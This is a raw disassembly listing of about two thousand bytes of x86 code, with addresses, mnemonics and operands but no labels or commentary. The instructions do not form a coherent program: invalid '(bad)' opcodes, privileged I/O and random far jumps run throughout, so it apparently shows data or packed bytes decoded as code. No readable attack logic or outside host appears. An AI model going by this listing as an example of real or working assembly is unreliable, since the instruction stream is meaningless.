  4118c5:	xor    BYTE PTR [eax+ebp*1],ch
  4118c8:	fidiv  WORD PTR [edx]
  4118ca:	jmp    0xe572e931
  4118cf:	dec    ecx
  4118d0:	mov    ch,0x9a
  4118d2:	fs inc eax
  4118d4:	lods   eax,DWORD PTR ds:[esi]
  4118d5:	or     eax,0xd2346f28
  4118da:	ins    DWORD PTR es:[edi],dx
  4118db:	mov    al,0xaf
  4118dd:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118df:	jnp    0x411923
  4118e1:	pop    ds
  4118e2:	fdiv   DWORD PTR [edi-0x3b]
  4118e5:	jae    0x411931
  4118e7:	and    BYTE PTR [ebx+0x3119bb77],0x4d
  4118ee:	pop    ecx
  4118ef:	jbe    0x411899
  4118f1:	rol    BYTE PTR [esi-0x37b38b5f],cl
  4118f7:	dec    eax
  4118f8:	sub    DWORD PTR [ebx],ebx
  4118fa:	sub    ebp,DWORD PTR [esi]
  4118fc:	jns    0x411914
  4118fe:	ret    
  4118ff:	out    dx,al
  411900:	retf   0x8f2e
  411903:	fmul   DWORD PTR [edx-0x68]
  411906:	adc    BYTE PTR [ecx],dh
  411908:	loopne 0x411932
  41190a:	dec    ecx
  41190b:	and    al,BYTE PTR [ebx-0x6e]
  41190e:	push   edx
  41190f:	loop   0x4118d9
  411911:	pusha  
  411912:	mov    ss,edi
  411914:	inc    eax
  411915:	bound  edx,QWORD PTR [eax-0x2f]
  411918:	mov    WORD PTR [ebx],ss
  41191a:	pop    ebp
  41191b:	mov    ah,bl
  41191d:	popa   
  41191e:	push   0xffffffc0
  411920:	ror    DWORD PTR [edx],cl
  411922:	test   BYTE PTR [eax-0x5f12087f],ah
  411928:	pop    edx
  411929:	jbe    0x4118db
  41192b:	push   esp
  41192c:	add    BYTE PTR [edx+0x1e],bl
  41192f:	mov    edi,0x5f9e80a2
  411934:	inc    esi
  411935:	arpl   WORD PTR [ebp+0x32362f0b],di
  41193b:	push   ebx
  41193c:	scas   al,BYTE PTR es:[edi]
  41193d:	and    bl,cl
  41193f:	in     eax,dx
  411940:	les    ecx,FWORD PTR [edi]
  411942:	int    0x78
  411944:	pushf  
  411945:	pop    edx
  411946:	jno    0x411993
  411948:	inc    edi
  411949:	test   eax,0xa3b0bc28
  41194e:	data16 add BYTE PTR [ecx-0x7a],al
  411952:	jb     0x411997
  411954:	test   al,0x5e
  411956:	dec    eax
  411957:	push   edx
  411958:	inc    eax
  411959:	stos   DWORD PTR es:[edi],eax
  41195a:	sub    esi,esp
  41195c:	mov    eax,ds:0x5b108052
  411961:	inc    esi
  411962:	scas   eax,DWORD PTR es:[edi]
  411963:	mov    BYTE PTR [ebp+0x48],bh
  411966:	ret    
  411967:	inc    DWORD PTR [esi-0x7a]
  41196a:	xor    eax,ebp
  41196c:	hlt    
  41196d:	out    dx,al
  41196e:	and    BYTE PTR [edi],bl
  411970:	sbb    al,0xae
  411972:	fdiv   st,st(5)
  411974:	xor    dl,0x19
  411977:	sbb    esi,ecx
  411979:	mov    ecx,0x5545706d
  41197e:	scas   eax,DWORD PTR es:[edi]
  41197f:	popf   
  411980:	or     cl,BYTE PTR [ebp+0xd]
  411983:	call   FWORD PTR [ebx+0xf]
  411986:	iret   
  411987:	or     esi,DWORD PTR [edx]
  411989:	bound  ecx,QWORD PTR [ebp-0x35f1ffcb]
  41198f:	(bad)  
  411990:	clc    
  411991:	pop    eax
  411992:	jno    0x411a01
  411994:	pop    es
  411995:	dec    edi
  411996:	push   ebp
  411997:	push   ebp
  411998:	xchg   DWORD PTR [ebx+0x4e],esi
  41199b:	out    0x49,eax
  41199d:	je     0x411920
  41199f:	pop    edi
  4119a0:	sbb    ebx,DWORD PTR [eax]
  4119a2:	push   cs
  4119a3:	clc    
  4119a4:	daa    
  4119a5:	jg     0x4119e7
  4119a7:	push   esp
  4119a8:	sbb    bh,cl
  4119aa:	dec    edx
  4119ab:	ret    0x66d8
  4119ae:	adc    DWORD PTR [edi+0x28],edx
  4119b1:	cmp    al,0xc2
  4119b3:	xchg   esp,eax
  4119b4:	xor    eax,0x9002e1f5
  4119b9:	(bad)  [ecx-0x1d]
  4119bc:	sub    al,0xa0
  4119be:	pop    ebx
  4119bf:	mov    eax,ds:0x9dd40e19
  4119c4:	push   eax
  4119c5:	inc    edx
  4119c6:	inc    esp
  4119c7:	pushf  
  4119c8:	fild   DWORD PTR [ecx-0x74ca5aa4]
  4119ce:	mov    ch,0x9c
  4119d0:	fisubr DWORD PTR [edi+0x15176b97]
  4119d6:	pop    ecx
  4119d7:	or     BYTE PTR [edi],cl
  4119d9:	sub    cl,al
  4119db:	sti    
  4119dc:	dec    esp
  4119dd:	das    
  4119de:	cmp    al,0x95
  4119e0:	mov    eax,ds:0xbf029625
  4119e5:	mov    esp,0x4725214d
  4119ea:	adc    dh,BYTE PTR [esi+ebx*1-0x5b1b93b3]
  4119f1:	fild   DWORD PTR ds:0x7eeb7ed5
  4119f8:	and    al,0xc6
  4119fa:	dec    ebp
  4119fb:	stos   DWORD PTR es:[edi],eax
  4119fc:	inc    edx
  4119fd:	je     0x4119c3
  4119ff:	aam    0x13
  411a01:	mov    edx,0xf161e672
  411a06:	and    BYTE PTR [ebp+0x7efd1e7f],0xc4
  411a0d:	or     al,0x49
  411a0f:	cmp    eax,0x8113a0f3
  411a14:	inc    ebx
  411a15:	jg     0x411a5e
  411a17:	cmp    ebx,esi
  411a19:	ja     0x411a0f
  411a1b:	mov    bh,0x8d
  411a1d:	mov    al,ds:0x462f14c
  411a22:	js     0x411a76
  411a24:	cmp    al,0x91
  411a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a27:	les    ebp,FWORD PTR [ecx+0x76]
  411a2a:	retf   
  411a2b:	(bad)  
  411a2c:	cmp    eax,0xfe5bd137
  411a31:	xchg   ecx,eax
  411a32:	lods   al,BYTE PTR ds:[esi]
  411a33:	stc    
  411a34:	fdivr  st,st(2)
  411a36:	pop    eax
  411a37:	jae    0x4119c2
  411a39:	mov    edi,0x9863dd82
  411a3e:	mov    eax,0x519d247b
  411a43:	xchg   esi,eax
  411a44:	scas   al,BYTE PTR es:[edi]
  411a45:	push   eax
  411a46:	cdq    
  411a47:	jmp    0x3085:0x8ae4d241
  411a4e:	test   DWORD PTR [ebp+0x5f],esp
  411a51:	repnz xor al,0x3c
  411a54:	popf   
  411a55:	add    esi,DWORD PTR [ebx-0x2382adfb]
  411a5b:	popa   
  411a5c:	cmp    DWORD PTR [ebp-0x6625c59e],edx
  411a62:	aam    0x64
  411a64:	cmp    eax,edi
  411a66:	pop    es
  411a67:	mov    al,0x61
  411a69:	mov    ebx,0x14518244
  411a6e:	(bad)  
  411a6f:	dec    ebx
  411a70:	mov    DWORD PTR [eax+0x17fc70ae],esi
  411a76:	add    ah,dh
  411a78:	xchg   al,ch
  411a7a:	add    al,0x12
  411a7c:	mov    ds:0x1c921adf,eax
  411a81:	(bad)
  411a84:	push   cs
  411a85:	jg     0x411aa0
  411a87:	test   al,0x84
  411a89:	sbb    eax,0xbb4a8283
  411a8e:	push   ds
  411a8f:	jmp    0x37a40303
  411a94:	data16 int 0x69
  411a97:	(bad)  
  411a98:	mov    al,0xe9
  411a9a:	cmp    edi,eax
  411a9c:	lock pop ss
  411a9e:	pushf  
  411a9f:	cmc    
  411aa0:	scas   eax,DWORD PTR es:[edi]
  411aa1:	or     eax,DWORD PTR [edi+0x70]
  411aa4:	test   eax,0x1ad8ccd6
  411aa9:	in     al,0xad
  411aab:	mov    esp,0xa2073f0f
  411ab0:	push   edx
  411ab1:	loope  0x411ab8
  411ab3:	lds    ebp,FWORD PTR [ebx+0x75cde8b6]
  411ab9:	sbb    eax,esp
  411abb:	mov    cl,0x7e
  411abd:	popf   
  411abe:	xor    eax,0xf51fcee9
  411ac3:	shr    BYTE PTR [ebp+edi*4-0x50],cl
  411ac7:	adc    BYTE PTR [edi],dh
  411ac9:	pop    ebp
  411aca:	jle    0x411b0a
  411acc:	inc    eax
  411acd:	dec    ecx
  411ace:	fst    DWORD PTR [edx]
  411ad0:	pop    esp
  411ad1:	or     BYTE PTR [edx+0x63],0x6b
  411ad5:	(bad)  
  411ad6:	repnz push ss
  411ad8:	jnp    0x411a6b
  411ada:	xchg   esi,eax
  411adb:	inc    ebp
  411adc:	jl     0x411aee
  411ade:	fsub   st,st(6)
  411ae0:	cmp    eax,0xabb29543
  411ae5:	lea    edx,[edx+ebx*8-0x3f6db28d]
  411aec:	mov    al,ds:0xdb116cf6
  411af1:	inc    edx
  411af2:	popa   
  411af3:	push   eax
  411af4:	cmc    
  411af5:	cs xchg ebx,eax
  411af7:	(bad)  
  411af8:	(bad)  
  411af9:	mov    eax,ds:0x1e57b910
  411afe:	gs popf 
  411b00:	(bad)  
  411b01:	jo     0x411ab1
  411b03:	aad    0xc
  411b05:	out    0x50,al
  411b07:	cmp    eax,0xf68f6851
  411b0c:	fwait
  411b0d:	and    ecx,eax
  411b0f:	lods   eax,DWORD PTR fs:[esi]
  411b11:	adc    ecx,DWORD PTR [ebx]
  411b13:	mov    ds:0x960e0a59,eax
  411b18:	cs loopne 0x411acc
  411b1b:	daa    
  411b1c:	mov    cl,BYTE PTR [edi+eiz*1]
  411b1f:	jnp    0x411b66
  411b21:	jb     0x411ac7
  411b23:	addr16 cld 
  411b25:	and    eax,DWORD PTR [ebx]
  411b27:	out    dx,al
  411b28:	iret   
  411b29:	into   
  411b2a:	neg    esi
  411b2c:	(bad)  [ebx+0x78409474]
  411b32:	lahf   
  411b33:	mov    ds:0xde04f7a1,eax
  411b38:	fcmovne st,st(2)
  411b3a:	(bad)  
  411b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b3c:	xchg   ebx,eax
  411b3d:	push   ebp
  411b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b3f:	mov    esp,0x6045c7e8
  411b44:	xor    ebx,eax
  411b46:	test   al,cl
  411b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b49:	lahf   
  411b4a:	sbb    DWORD PTR ds:[eax+esi*1-0x289b4138],0xffffffa7
  411b53:	sub    al,bl
  411b55:	push   edi
  411b56:	push   edx
  411b57:	in     eax,dx
  411b58:	mov    ah,0x1c
  411b5a:	dec    ebx
  411b5b:	jge    0x411bda
  411b5d:	inc    ebp
  411b5e:	ror    BYTE PTR [edi-0x70e94c07],1
  411b64:	bound  ecx,QWORD PTR [eax]
  411b66:	adc    dl,BYTE PTR [esi-0x66]
  411b69:	mov    edi,0xa5487ae1
  411b6e:	add    BYTE PTR [ebp+edi*4-0x3b355e72],0xa8
  411b76:	mov    edx,0x30fd7a26
  411b7b:	sbb    edi,DWORD PTR [edi]
  411b7d:	rcl    BYTE PTR [esi+0x23c77235],0x14
  411b84:	das    
  411b85:	jg     0x411bfa
  411b87:	or     esp,esp
  411b89:	les    esp,FWORD PTR [edi]
  411b8b:	mov    ax,0x115
  411b8f:	mov    ch,0x64
  411b91:	and    BYTE PTR [esi-0x4d],al
  411b94:	add    al,0xe7
  411b96:	mov    ebp,0x7e669299
  411b9b:	and    ecx,DWORD PTR [edx+edx*8]
  411b9e:	outs   dx,BYTE PTR ds:[esi]
  411b9f:	xor    BYTE PTR ds:0xa3867f90,0x18
  411ba6:	add    BYTE PTR [eax-0x3a],0x20
  411baa:	call   0xef75:0xf84edd48
  411bb1:	xor    bl,ch
  411bb3:	push   esp
  411bb4:	dec    ebx
  411bb5:	sbb    al,0x43
  411bb7:	lahf   
  411bb8:	mov    eax,0x1f15fa02
  411bbd:	aad    0x53
  411bbf:	retf   
  411bc0:	mov    edi,0x2a31b914
  411bc5:	mov    dh,0xa7
  411bc7:	lock psubd mm2,QWORD PTR ds:0x75530da2
  411bcf:	daa    
  411bd0:	rcl    BYTE PTR [ecx],0xdf
  411bd3:	arpl   sp,di
  411bd5:	cs fwait
  411bd7:	mov    ah,0xc5
  411bd9:	sbb    ch,BYTE PTR [edx+ebp*4+0x20]
  411bdd:	js     0x411be2
  411bdf:	push   es
  411be0:	ret    0x626b
  411be3:	and    esp,eax
  411be5:	mov    ecx,0x6330e7af
  411bea:	jb     0x411c57
  411bec:	push   0x21
  411bee:	test   eax,0x8abbb01a
  411bf3:	xchg   edi,eax
  411bf4:	imul   DWORD PTR [esi+0x401debfa]
  411bfa:	fbstp  TBYTE PTR [ebp+eax*2+0x27d71bb6]
  411c01:	push   es
  411c02:	pop    ebp
  411c03:	lds    esi,FWORD PTR ds:0x90fe67af
  411c09:	push   ecx
  411c0a:	std    
  411c0b:	(bad)  
  411c0c:	fsubr  DWORD PTR [edx-0x30]
  411c0f:	xor    ebx,0xf43921ef
  411c15:	cmp    al,ah
  411c17:	jp     0x411bc1
  411c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c1a:	pop    ebp
  411c1b:	jecxz  0x411be5
  411c1d:	inc    ebp
  411c1e:	sub    ecx,DWORD PTR [ecx]
  411c20:	inc    esp
  411c21:	xor    bl,BYTE PTR [edi+0x63]
  411c24:	repz pusha 
  411c26:	sub    BYTE PTR [edi+0x59],al
  411c29:	sar    DWORD PTR [eax],0xba
  411c2c:	mov    ss,WORD PTR ds:0xea377713
  411c32:	ja     0x411bc6
  411c34:	push   ebp
  411c35:	cwde   
  411c36:	aas    
  411c37:	(bad)  
  411c38:	cdq    
  411c39:	lock scas eax,DWORD PTR es:[edi]
  411c3b:	(bad)  [ebx+0x5aa73bd6]
  411c41:	out    dx,eax
  411c42:	jmp    0xf353:0xf7f0dab
  411c49:	push   ebp
  411c4a:	sbb    al,0x7f
  411c4c:	ret    
  411c4d:	in     eax,0x6b
  411c4f:	ds mov ebp,0xa272a034
  411c55:	or     eax,0xf98cebf9
  411c5a:	es int3 
  411c5c:	call   0xd4ed:0x787e9202
  411c63:	fiadd  WORD PTR [ebx]
  411c65:	push   ss
  411c66:	ja     0x411c1f
  411c68:	cmp    eax,0xd4997188
  411c6d:	(bad)  
  411c6e:	jg     0x411cc8
  411c70:	stos   BYTE PTR es:[edi],al
  411c71:	out    dx,eax
  411c72:	or     BYTE PTR [esi+0x44],0xbe
  411c76:	jecxz  0x411c61
  411c78:	or     al,0x52
  411c7a:	daa    
  411c7b:	cs aad 0x7f
  411c7e:	mov    ds:0xc754cfa9,al
  411c83:	mov    bl,0x3
  411c85:	rcl    BYTE PTR [ecx-0x63f92875],0xf
  411c8c:	jo     0x411c5a
  411c8e:	dec    eax
  411c8f:	xchg   DWORD PTR [edi],edi
  411c91:	loop   0x411c92
  411c93:	push   ebx
  411c94:	inc    eax
  411c95:	mov    eax,ds:0xde6f28c3
  411c9a:	ret    
  411c9b:	push   edx
  411c9c:	mov    al,dl
  411c9e:	hlt    
  411c9f:	add    al,0x1d
  411ca1:	xor    dh,BYTE PTR [esi-0x4d]
  411ca4:	mov    edi,0x411682f8
  411ca9:	dec    edi
  411caa:	fcomip st,st(3)
  411cac:	and    al,0xd3
  411cae:	sub    eax,0xcd92d31c
  411cb3:	cli    
  411cb4:	iret   
  411cb5:	xor    DWORD PTR [edx-0x37],ebp
  411cb8:	cmp    DWORD PTR [esi+0x6cc1ed5b],ebp
  411cbe:	scas   al,BYTE PTR es:[edi]
  411cbf:	sbb    esi,DWORD PTR [edi-0x5e]
  411cc2:	fld    QWORD PTR [ecx+ebp*8-0x2c]
  411cc6:	dec    edx
  411cc7:	imul   ebp,DWORD PTR [ebx],0x69
  411cca:	xchg   edx,eax
  411ccb:	sub    DWORD PTR [ebp+0x79],esi
  411cce:	pusha  
  411ccf:	jb     0x411cab
  411cd1:	mov    edx,0xf704623
  411cd6:	popf   
  411cd7:	shl    BYTE PTR [ecx-0x64b830f1],0xe8
  411cde:	(bad)  
  411cdf:	mov    esp,DWORD PTR [esi-0x2355fbb3]
  411ce5:	mov    ah,BYTE PTR [esi-0x5203a97]
  411ceb:	mov    esp,0x9f7744c7
  411cf0:	push   eax
  411cf1:	rcr    dl,cl
  411cf3:	mov    bl,0xff
  411cf5:	imul   eax,DWORD PTR [eax+0x345edd95],0x20a52a81
  411cff:	adc    BYTE PTR [ecx-0x32],dh
  411d02:	shl    DWORD PTR [edx-0x356e1664],cl
  411d08:	dec    ebp
  411d09:	in     eax,dx
  411d0a:	cli    
  411d0b:	loope  0x411d69
  411d0d:	lahf   
  411d0e:	push   edi
  411d0f:	and    al,0x59
  411d11:	cmp    al,dl
  411d13:	xor    DWORD PTR [ebx+0x3d117585],0xe0646b77
  411d1d:	leave  
  411d1e:	loope  0x411d42
  411d20:	in     eax,0xbd
  411d22:	mov    cl,0xb4
  411d24:	inc    esp
  411d25:	inc    edx
  411d26:	adc    cl,BYTE PTR [eax-0x38]
  411d29:	cmp    al,0x20
  411d2b:	jnp    0x411d08
  411d2d:	sub    BYTE PTR [edx+0x60],dl
  411d30:	mov    cl,0xc4
  411d32:	add    eax,0xf3b45e
  411d37:	fisubr WORD PTR [eax]
  411d39:	xor    ebp,esp
  411d3b:	sbb    edx,DWORD PTR [edi+0x7170a0d3]
  411d41:	and    edx,0xd5e3a39f
  411d47:	ret    0x4363
  411d4a:	jecxz  0x411d4c
  411d4c:	adc    bh,bh
  411d4e:	push   esp
  411d4f:	cs jae 0x411d2a
  411d52:	dec    ebp
  411d53:	in     eax,dx
  411d54:	inc    ebx
  411d55:	fnstenv [ebx+ebx*2]
  411d58:	sub    al,0x11
  411d5a:	cli    
  411d5b:	cmp    eax,0x8c6be324
  411d60:	sbb    al,0x39
  411d62:	data16 sub bl,dh
  411d65:	add    eax,0xad8c0021
  411d6a:	push   esp
  411d6b:	shr    ah,1
  411d6d:	inc    esi
  411d6e:	xor    al,0xf0
  411d70:	pop    ebp
  411d71:	pop    DWORD PTR [esp+edi*1-0x5a8d5075]
  411d78:	xchg   edi,eax
  411d79:	ret    
  411d7a:	push   0x3594a551
  411d7f:	add    al,0x85
  411d81:	into   
  411d82:	or     ah,0x10
  411d85:	pop    ds
  411d86:	pop    ecx
  411d87:	add    ebp,DWORD PTR [eax+0x510743c0]
  411d8d:	(bad)  
  411d90:	and    BYTE PTR gs:[ebx],0x75
  411d94:	mov    DWORD PTR [eax-0x657667e3],edi
  411d9a:	or     eax,eax
  411d9c:	les    ebx,FWORD PTR [eax+0x20]
  411d9f:	stos   DWORD PTR es:[edi],eax
  411da0:	outs   dx,BYTE PTR ds:[esi]
  411da1:	push   cs
  411da2:	or     bh,dh
  411da4:	js     0x411df4
  411da6:	adc    cl,ah
  411da8:	aad    0xe7
  411daa:	add    esp,DWORD PTR [esi+0xd]
  411dad:	pop    ecx
  411dae:	mov    ebp,ebx
  411db0:	lods   al,BYTE PTR ds:[esi]
  411db1:	add    esp,DWORD PTR [ebx+ebx*1-0x76aac592]
  411db8:	(bad)
  411dbd:	cmp    ah,BYTE PTR [eax-0x19c95866]
  411dc3:	add    al,0x97
  411dc5:	les    ebx,FWORD PTR ds:0x33bf6055
  411dcb:	imul   ebx,ebp,0x90c62529
  411dd1:	hlt    
  411dd2:	push   ecx
  411dd3:	out    0x3f,eax
  411dd5:	pop    edi
  411dd6:	mov    edi,0x9f31a44d
  411ddb:	out    0x7a,al
  411ddd:	and    eax,0x30302940
  411de2:	and    DWORD PTR [ebx],ebx
  411de4:	jecxz  0x411d79
  411de6:	fsubr  QWORD PTR [esi]
  411de8:	adc    dh,dh
  411dea:	push   ds
  411deb:	mov    ebx,0x9d4232e0
  411df0:	push   es
  411df1:	push   esi
  411df2:	add    eax,0x6f86e3da
  411df7:	jmp    0x2b6:0x83d41e59
  411dfe:	cmp    ah,BYTE PTR [esi+0x46]
  411e01:	clc    
  411e02:	clc    
  411e03:	push   ecx
  411e04:	add    DWORD PTR [ecx+0x2d7a30c7],esp
  411e0a:	sti    
  411e0b:	pusha  
  411e0c:	(bad)  
  411e0d:	test   eax,0x724bac11
  411e12:	loope  0x411dcb
  411e14:	inc    ebx
  411e15:	jno    0x411d9d
  411e17:	clc    
  411e18:	sbb    eax,0xa81164d1
  411e1d:	push   edi
  411e1e:	or     eax,0x1ef74783
  411e23:	and    ch,0x82
  411e26:	fadd   QWORD PTR [ebx+0x6e]
  411e29:	xor    esp,ebp
  411e2b:	xchg   edx,eax
  411e2c:	fs and al,0xaf
  411e2f:	push   edx
  411e30:	popa   
  411e31:	sbb    DWORD PTR [ebx],ebp
  411e33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e35:	lahf   
  411e36:	push   ebp
  411e37:	inc    edx
  411e38:	inc    ecx
  411e39:	pop    edi
  411e3a:	ins    BYTE PTR es:[edi],dx
  411e3b:	and    ch,cl
  411e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e3e:	or     al,0xfb
  411e40:	mov    bl,0x5b
  411e42:	push   ds
  411e43:	push   cs
  411e44:	or     bl,BYTE PTR [eax+edx*2-0x6d613a11]
  411e4b:	cmp    BYTE PTR [ecx+edi*4+0x44],cl
  411e4f:	mov    ecx,0x6075dd17
  411e54:	jl     0x411e31
  411e56:	call   0x6bb5ab51
  411e5b:	sub    esi,DWORD PTR [ebp+0x1f]
  411e5e:	pop    esp
  411e5f:	sbb    ecx,DWORD PTR [esi+0x7defc693]
  411e65:	sbb    BYTE PTR [eax-0x27],bl
  411e68:	jecxz  0x411e38
  411e6a:	lahf   
  411e6b:	pop    ss
  411e6c:	sub    eax,0x4a8c2d92
  411e71:	fst    DWORD PTR [ebx-0x47]
  411e74:	pop    ds
  411e75:	xlat   BYTE PTR ds:[ebx]
  411e76:	cmp    edi,DWORD PTR [edx]
  411e78:	(bad)  
  411e79:	(bad)  
  411e7a:	das    
  411e7b:	mov    dh,0xeb
  411e7d:	inc    ecx
  411e7e:	mov    ch,0x9b
  411e80:	sbb    DWORD PTR [edi+esi*2+0x7c],edx
  411e84:	test   eax,0x5e23baa3
  411e89:	xchg   BYTE PTR [edi],dl
  411e8b:	push   0x368da563
  411e90:	cld    
  411e91:	xchg   DWORD PTR [ecx-0x6c],edx
  411e94:	jmp    0x411eb7
  411e96:	fisttp WORD PTR [edx+0x508b86fe]
  411e9c:	ja     0x411e41
  411e9e:	xchg   ebp,eax
  411e9f:	xor    esi,edx
  411ea1:	xlat   BYTE PTR ds:[ebx]
  411ea2:	xchg   ecx,eax
  411ea3:	adc    BYTE PTR [edx-0x5fa4de6c],dl
  411ea9:	mov    ?,WORD PTR [esi+0x2c]
  411eac:	cmp    eax,DWORD PTR [eax]
  411eae:	mov    al,ch
  411eb0:	test   DWORD PTR [esi+0x726f5c5b],edi
  411eb6:	dec    esi
  411eb7:	sub    BYTE PTR [eax],cl
  411eb9:	jo     0x411f2e
  411ebb:	fisttp QWORD PTR [ebx+0x7d]
  411ebe:	lahf   
  411ebf:	jle    0x411efa
  411ec1:	lods   al,BYTE PTR ds:[esi]
  411ec2:	mov    ds:0x74cd55ae,eax
  411ec7:	mov    esp,0x8b23433d
  411ecc:	sahf   
  411ecd:	pop    es
  411ece:	int    0x51
  411ed0:	popf   
  411ed1:	jp     0x411e6a
  411ed3:	jle    0x411ed8
  411ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed6:	jp     0x411ec4
  411ed8:	dec    ebp
  411ed9:	fmul   DWORD PTR [edi+0x42]
  411edc:	data16 (bad) 
  411ede:	out    0x62,eax
  411ee0:	cli    
  411ee1:	xor    al,0xea
  411ee3:	outs   dx,BYTE PTR ds:[esi]
  411ee4:	aam    0x69
  411ee6:	add    al,0x48
  411ee8:	seta   BYTE PTR [edi]
  411eeb:	jnp    0x411e9c
  411eed:	jg     0x411f46
  411eef:	int    0xa7
  411ef1:	ins    BYTE PTR es:[edi],dx
  411ef2:	icebp  
  411ef3:	inc    esp
  411ef4:	push   cs
  411ef5:	jmp    0xd327:0xd37c066e
  411efc:	aam    0x6e
  411efe:	ret    0x6ff7
  411f01:	ss data16 cli 
  411f04:	aam    0x7f
  411f06:	icebp  
  411f07:	lds    ecx,FWORD PTR gs:[edi+edi*2]
  411f0b:	add    DWORD PTR [ecx],ecx
  411f0d:	sbb    BYTE PTR [eax-0x300ba4b0],bh
  411f13:	loope  0x411ec1
  411f15:	test   al,0xc5
  411f17:	fxch   st(4)
  411f19:	repz adc ch,BYTE PTR [esi]
  411f1c:	ret    
  411f1d:	adc    ebx,esi
  411f1f:	xlat   BYTE PTR ds:[ebx]
  411f20:	jp     0x411f86
  411f22:	rol    BYTE PTR [edi+edx*8-0x1c84a78f],0xc6
  411f2a:	mov    dh,BYTE PTR [ecx+0x5e0c4c41]
  411f30:	jo     0x411f29
  411f32:	or     dl,BYTE PTR [ecx]
  411f34:	ins    BYTE PTR es:[edi],dx
  411f35:	mov    ecx,0x2288605b
  411f3a:	inc    edi
  411f3b:	ret    
  411f3c:	lods   eax,DWORD PTR ds:[esi]
  411f3d:	pusha  
  411f3e:	and    eax,0xf088c248
  411f43:	cmp    bl,bh
  411f45:	ret    0xe338
  411f48:	outs   dx,DWORD PTR ds:[esi]
  411f49:	push   ss
  411f4a:	push   0xb06ab257
  411f4f:	cmp    esi,ebp
  411f51:	mov    ecx,0x4c8b8436
  411f56:	stc    
  411f57:	cs cmp al,0x93
  411f5a:	xchg   BYTE PTR [esi+0x5002a1e2],dl
  411f60:	mov    es,WORD PTR [edx+esi*4-0x7e993466]
  411f67:	ds test al,0x74
  411f6a:	jecxz  0x411fcd
  411f6c:	adc    bl,al
  411f6e:	mov    ah,0x20
  411f70:	cmp    ebp,eax
  411f72:	in     eax,0xba
  411f74:	clc    
  411f75:	dec    esi
  411f76:	icebp  
  411f77:	pop    ebp
  411f78:	sub    al,0x7f
  411f7a:	hlt    
  411f7b:	cmp    al,0xb8
  411f7d:	rcr    BYTE PTR [edi+ebp*2],cl
  411f80:	dec    ebp
  411f81:	mov    esp,0x7e5cf57f
  411f86:	and    BYTE PTR [edx-0x3b],ah
  411f89:	leave  
  411f8a:	cmp    ebx,edi
  411f8c:	add    BYTE PTR [eax-0x37],ch
  411f8f:	fs sbb ah,bh
  411f92:	pop    edx
  411f93:	mov    edx,0xa29b1d88
  411f98:	loop   0x411f99
  411f9a:	out    dx,eax
  411f9b:	mov    ds:0x5b151b69,al
  411fa0:	xchg   ebp,eax
  411fa1:	push   es
  411fa2:	or     eax,0xffffffce
  411fa5:	mov    cl,0x0
  411fa7:	(bad)  
  411fa8:	jne    0x411f36
  411faa:	enter  0xf910,0xc1
  411fae:	cmp    DWORD PTR [edi],eax
  411fb0:	mov    eax,0xfd9b8df
  411fb5:	xchg   ebx,eax
  411fb6:	adc    BYTE PTR [edi],dl
  411fb8:	jge    0x411fc7
  411fba:	mov    edx,0xa75c24de
  411fbf:	call   0x837d88c3
  411fc4:	das    
  411fc5:	cli    
  411fc6:	daa    
  411fc7:	sub    al,ah
  411fc9:	pusha  
  411fca:	sti    
  411fcb:	fild   WORD PTR [edi]
  411fcd:	jecxz  0x412020
  411fcf:	bound  ecx,QWORD PTR [esi]
  411fd1:	mov    bl,0x40
  411fd3:	pop    eax
  411fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fd5:	loope  0x41202c
  411fd7:	ret    0x4881
  411fda:	stc    
  411fdb:	pushf  
  411fdc:	push   es
  411fdd:	cmc    
  411fde:	(bad)  
  411fdf:	jmp    0x7185:0xc0c1a0bb
  411fe6:	jnp    0x412038
  411fe8:	jae    0x41204e
  411fea:	jp     0x41206b
  411fec:	jmp    0xe984:0x1d2c38c1
  411ff3:	dec    eax
  411ff4:	test   eax,0x8f1445e6
  411ff9:	adc    ah,al
  411ffb:	add    BYTE PTR [ecx+0xd346ec4],dh
  412001:	in     eax,dx
  412002:	cmc    
  412003:	or     esp,DWORD PTR [ecx+ebp*1]
  412006:	pop    ecx
  412007:	nop
  412008:	das    
  412009:	cmp    ebx,DWORD PTR [eax+0xd]
  41200c:	add    esi,DWORD PTR [ecx+0x3ba3f652]
  412012:	js     0x41200f
  412014:	out    dx,eax
  412015:	(bad)  
  412016:	cmp    al,0x1b
  412018:	inc    edx
  412019:	pop    ebp
  41201a:	cs add al,0x8f
  41201d:	jp     0x412012
  41201f:	inc    ecx
  412020:	sbb    BYTE PTR [edx],bl
  412022:	jmp    0xb1bdd64
  412027:	cmp    bl,BYTE PTR [esi-0x6c872524]
  41202d:	inc    eax
  41202e:	mov    ds:0x62fa065a,al
  412033:	or     eax,0xaa5074
  412038:	cmp    BYTE PTR [ecx-0xae374ea],0x9e
  41203f:	push   ss
  412040:	jb     0x412016
  412042:	jo     0x41203b
  412044:	mov    DWORD PTR [edi-0x20a1a113],0x7656fbfe
  41204e:	jo     0x4120c2
  412050:	dec    BYTE PTR [edx]
  412052:	loopne 0x4120b1
  412054:	inc    edi
  412055:	mov    ch,0x58
  412057:	push   edi
  412058:	jmp    DWORD PTR [edx+0x2f]
  41205b:	outs   dx,DWORD PTR ds:[esi]
  41205c:	stos   DWORD PTR es:[edi],eax
  41205d:	bound  edx,QWORD PTR [si-0x7bdd]
  412062:	outs   dx,BYTE PTR ds:[esi]
  412063:	pop    edi
  412064:	call   0x426939f6
  412069:	loopne 0x412082
  41206b:	test   DWORD PTR [edi+esi*1-0x6b],edx
  41206f:	xor    al,BYTE PTR [edx-0x14]
  412072:	xchg   edi,eax
  412073:	push   ss
  412074:	xor    DWORD PTR ds:0x7e186adb,0x6323e275
  41207e:	cmp    ecx,esp
  412080:	int    0x76
  412082:	fstp   QWORD PTR [eax-0x4b]
  412085:	and    BYTE PTR [eax+0x6a1b43d4],ah
  41208b:	sar    al,0xa3
  41208e:	mov    ebp,0x16595cc4
  412093:	mov    cl,0x2d
  412095:	pushf  
